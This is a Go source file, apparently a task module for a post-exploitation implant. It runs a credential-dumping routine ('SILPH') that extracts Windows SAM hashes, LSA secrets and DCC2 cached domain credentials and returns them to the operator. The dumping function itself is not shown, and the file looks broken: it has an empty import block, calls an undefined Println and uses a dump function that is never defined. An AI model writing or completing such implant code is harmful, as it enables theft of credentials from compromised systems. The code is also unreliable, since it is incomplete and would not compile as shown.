package main

/*
#include <stdlib.h>
*/
import "C"

import (
)

type Task struct {
	TaskId string `json:"taskid"`
	SAM    string  `json:"sam"`
	LSA    string  `json:"lsa"`
	DCC2   string  `json:"dcc2"`

	// General Purpose
	status   string
	tasktype string
}

func InitialiseTask(task *Task) error {
	task.tasktype = "respsilph"
	return nil
}

func TaskHandler(task *Task) (stdout []byte, err error) {

	Println("SILPH started")
	Println("Args are -> sam,lsa,dcc2 = ", task.SAM, task.LSA, task.DCC2)

	sam := task.SAM == "1"
	lsa := task.LSA == "1"
	dcc2 := task.DCC2 == "1"
	stdout, err = dump(sam, lsa, dcc2)
	if err != nil {
		task.status = "failed"
		return []byte(err.Error()), err
	}
	task.status = "completed"
	return stdout, err
}

// Tell us if task if done (failed or completed)
func IsTaskDone(task Task) bool {
	if task.status == "completed" || task.status == "failed" {
		return true
	}
	return false
}

// Return Task Status
func ComputeTaskStatus(task Task) string {
	return task.status
}

// Return Task Type
func ComputeTaskType(task Task) string {
	return task.tasktype
}
